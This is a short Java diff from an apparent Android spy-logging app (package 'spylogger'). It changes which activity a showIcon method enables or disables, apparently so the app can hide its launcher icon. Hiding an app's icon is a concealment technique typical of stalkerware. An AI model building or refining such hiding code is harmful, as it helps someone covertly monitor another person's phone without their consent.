@@ -318,7 +318,7 @@ public class Utils {
     }
 
     public static void showIcon(boolean show, Context ctx) {
-        ComponentName componentToDisable = new ComponentName("com.gravatasufoca.spylogger", "com.gravatasufoca.spylogger.activities.MainActivity");
+        ComponentName componentToDisable = new ComponentName("com.gravatasufoca.spylogger", "com.gravatasufoca.spylogger.activities.LoginActivity");
         PackageManager p = ctx.getPackageManager();
         if (show)
             p.setComponentEnabledSetting(componentToDisable, PackageManager.COMPONENT_ENABLED_STATE_DEFAULT, PackageManager.DONT_KILL_APP);
